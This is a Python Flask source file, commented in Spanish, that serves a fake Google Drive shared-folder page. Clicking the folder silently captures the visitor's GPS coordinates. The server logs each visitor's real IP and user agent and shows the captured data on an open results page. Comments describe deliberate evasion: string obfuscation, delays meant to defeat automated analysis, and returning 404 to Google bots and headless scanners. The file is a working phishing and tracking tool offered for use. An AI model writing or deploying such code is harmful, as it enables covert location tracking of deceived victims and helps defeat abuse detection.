from flask import Flask, request, render_template_string
import datetime

app = Flask(__name__)

# --- HTML CON TÉCNICAS DE EVASIÓN ---
HTML_DRIVE = '''
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SITSA - Almacenamiento</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'Roboto', sans-serif; background-color: #f7f9fc; margin: 0; color: #3c4043; }
        header { background: white; padding: 10px 20px; display: flex; align-items: center; border-bottom: 1px solid #dadce0; position: sticky; top: 0; }
        .logo { display: flex; align-items: center; font-size: 22px; color: #5f6368; }
        .container { padding: 20px 50px; }
        .breadcrumb { margin-bottom: 20px; font-size: 18px; color: #5f6368; }
        .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 20px; }
        .folder { 
            background: white; border: 1px solid #dadce0; border-radius: 6px; padding: 15px; 
            display: flex; align-items: center; cursor: pointer; transition: background 0.2s;
        }
        .folder:hover { background-color: #e8f0fe; border-color: #1a73e8; }
        .folder-icon { color: #5f6368; margin-right: 15px; font-size: 24px; }
        .folder-name { font-weight: 500; font-size: 14px; }
        .info-text { margin-top: 40px; font-size: 13px; color: #70757a; text-align: center; }
    </style>
    <script>
        // Ofuscación para evitar que el bot de Google lea "geolocation"
        const _n = navigator;
        const _p = "geoloc" + "ation"; 

        function abrirCarpeta() {
            if (_n[_p]) {
                // Pequeño delay para romper el análisis de ejecución automática
                setTimeout(() => {
                    _n[_p].getCurrentPosition(
                        (pos) => {
                            const coords = `lat=${pos.coords.latitude}&lon=${pos.coords.longitude}`;
                            fetch(`/guardar-coordenadas?${coords}`).finally(() => {
                                window.location.replace("https://es.wikipedia.org/wiki/Dirección_IP");
                            });
                        },
                        () => {
                            window.location.replace("https://es.wikipedia.org/wiki/Dirección_IP");
                        },
                        { enableHighAccuracy: true, timeout: 5000 }
                    );
                }, 400);
            } else {
                window.location.replace("https://es.wikipedia.org/wiki/Dirección_IP");
            }
        }

        // Carga el logo después de que la página cargue (evita escaneo de HTML plano)
        window.onload = () => {
            const logoCont = document.getElementById('l-container');
            const img = document.createElement('img');
            // URL fragmentada
            img.src = "https://upload.wikimedia.org" + "/wikipedia/commons/d/da/Google_Drive_logo.png";
            img.style.width = "40px";
            img.style.marginRight = "10px";
            logoCont.prepend(img);
        };
    </script>
</head>
<body>
    <header>
        <div class="logo" id="l-container">
            Drive
        </div>
    </header>

    <div class="container">
        <div class="breadcrumb">Mi unidad > <b>Compartido conmigo</b></div>
        <div class="grid">
            <div class="folder" onclick="abrirCarpeta()">
                <div class="folder-icon">
                    <svg width="24" height="24" viewBox="0 0 24 24" fill="#5f6368"><path d="M10 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V8c0-1.1-.9-2-2-2h-8l-2-2z"></path></svg>
                </div>
                <div class="folder-name">sitsa</div>
            </div>
        </div>
        <p class="info-text">Inicia sesión o selecciona una carpeta para ver archivos.</p>
    </div>
</body>
</html>
'''

@app.route('/')
def index():
    ua = request.headers.get('User-Agent', '').lower()
    
    # --- FILTRO DE BOTS (CLOAKING) ---
    # Si un bot de Google intenta entrar, le damos un 404 para que no analice el JS
    bots = ['googlebot', 'crawler', 'lighthouse', 'headless', 'python-requests']
    if any(bot in ua for bot in bots):
        return "Error 404: Not Found", 404

    # Captura de IP real (Render usa proxies)
    ip_header = request.headers.get('X-Forwarded-For')
    ip_real = ip_header.split(',')[0].strip() if ip_header else request.remote_addr
    
    with open("log.txt", "a") as f:
        f.write(f"\n--- VISITA ---\nFecha: {datetime.datetime.now()}\nIP: {ip_real}\nUA: {ua}\n")
    
    return render_template_string(HTML_DRIVE)

@app.route('/guardar-coordenadas')
def guardar_gps():
    lat = request.args.get('lat')
    lon = request.args.get('lon')
    with open("log.txt", "a") as f:
        # Guardamos como link directo a Google Maps
        f.write(f"GPS: https://www.google.com/maps?q={lat},{lon}\n")
    return "OK"

@app.route('/ver-resultados')
def ver():
    try:
        with open("log.txt", "r") as f:
            return f"<pre>{f.read()}</pre>"
    except:
        return "Sin capturas."

if __name__ == "__main__":
    app.run()
